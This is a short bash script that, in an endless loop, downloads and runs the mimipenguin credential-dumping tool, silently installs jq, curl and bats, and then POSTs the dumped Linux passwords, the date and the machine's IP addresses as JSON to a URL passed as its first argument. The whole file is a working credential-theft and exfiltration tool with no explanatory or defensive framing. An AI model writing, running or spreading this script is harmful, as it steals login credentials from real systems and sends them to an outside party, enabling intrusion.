#!/bin/bash

VERSION="2.0"
RELEASE="mimipenguin_$VERSION-release"
PYPATH="/tmp/$RELEASE/mimipenguin.py"
SHPATH="/tmp/$RELEASE/mimipenguin.sh"

while true; do
    if [ -f $PYPATH ] || [ -f $SHPATH ]; then
        :
    else
        wget -O /tmp/mimi.tar.gz https://github.com/huntergregal/mimipenguin/releases/download/$VERSION-release/$RELEASE.tar.gz
        tar -xf /tmp/mimi.tar.gz
    fi

    if [ -f $PYPATH ]; then
        if [ -f /usr/bin/python ]; then
            python $PYPATH >/tmp/tmp.txt
        elif [ -f /usr/bin/python3 ]; then
            python3 $PYPATH >/tmp/tmp.txt
        else
            :
        fi
    else
        bash $SHPATH >/tmp/tmp.txt
    fi

    REQ="jq curl bats"

    for pkg in $REQ; do
        [ "$(dpkg -s "$pkg")" ] || apt install "$pkg" -y
    done

    res=($(cat /tmp/tmp.txt) $(echo "//") $(date) $(echo "//") $(ip addr show scope global | awk '$1 ~ /^inet/ {print $2}'))
    sendcontent='{"content": "'"${res[@]}"'"}'
    curl -H "Content-Type: application/json" -d "$sendcontent" "$1"

done
